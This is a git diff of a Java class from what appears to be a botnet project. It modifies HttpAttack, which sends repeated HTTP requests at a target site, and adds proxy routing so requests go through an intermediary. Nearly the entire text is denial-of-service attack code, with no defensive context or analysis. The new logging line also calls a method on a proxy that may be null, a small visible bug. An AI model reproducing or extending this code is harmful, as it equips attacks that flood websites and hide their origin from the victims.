@@ -24,15 +24,16 @@
   THE SOFTWARE.
  */
 
-package com.acmutv.botnet.core.attack.http;
+package com.acmutv.botnet.core.attack;
 
 import com.acmutv.botnet.core.target.HttpTarget;
 import com.acmutv.botnet.tool.net.HttpManager;
 import com.acmutv.botnet.tool.net.HttpMethod;
+import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.time.Duration;
 import com.acmutv.botnet.tool.time.Interval;
 import lombok.AllArgsConstructor;
-import lombok.Getter;
+import lombok.Data;
 import lombok.NonNull;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -48,17 +49,26 @@ import java.util.concurrent.ThreadLocalRandom;
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
- * @see HttpGetAttack
- * @see HttpPostAttack
  * @see HttpTarget
  */
-@Getter
+@Data
 @AllArgsConstructor
-public abstract class HttpAttack implements Runnable {
+public class HttpAttack implements Attacker {
 
   protected static final Logger LOGGER = LogManager.getLogger(HttpAttack.class);
 
+  /**
+   * Max number of connection failure before attack interruption.
+   */
   private static final long MAX_ERRORS= 10;
+
+  public HttpAttack(HttpMethod method, HttpTarget target) {
+    this(method, target, null);
+  }
+
+  public HttpAttack(HttpMethod method, HttpTarget target, HttpProxy proxy) {
+    this(method, target, proxy, new HashMap<>());
+  }
 
   /**
    * The HTTP request method.
@@ -67,16 +77,21 @@ public abstract class HttpAttack implements Runnable {
   private HttpMethod method;
 
   /**
-   * The HTTP request properties.
-   */
-  @NonNull
-  private final Map<String,String> properties = new HashMap<>();
-
-  /**
    * The target to attack.
    */
   @NonNull
   private HttpTarget target;
+
+  /**
+   * The proxy to attack by.
+   */
+  private HttpProxy proxy;
+
+  /**
+   * The HTTP request properties.
+   */
+  @NonNull
+  private Map<String,String> properties = new HashMap<>();
 
   /**
    * Executes the attack lifecycle.
@@ -91,8 +106,8 @@ public abstract class HttpAttack implements Runnable {
 
     for (long i = 0; i < maxAttempts; i++) {
       try {
-        LOGGER.info("Launching HTTP attack: {} {} ({}/{})",
-            this.getMethod(), url, i, maxAttempts);
+        LOGGER.info("Launching HTTP attack: {} {} with proxy {} ({}/{})",
+            this.getMethod(), url, this.getProxy().address(), i, maxAttempts);
         this.makeAttack(url);
       } catch (IOException exc) {
         errors ++;
@@ -119,7 +134,7 @@ public abstract class HttpAttack implements Runnable {
   public void makeAttack(final URL url) throws IOException {
     LOGGER.traceEntry("url={}", url);
 
-    final int response = HttpManager.makeRequest(this.getMethod(), url, this.getProperties());
+    final int response = HttpManager.makeRequest(this.getMethod(), url, this.getProperties(), this.getProxy());
 
     LOGGER.info("Attack response :: {} {} :: {}", this.getMethod(), url, response);
   }
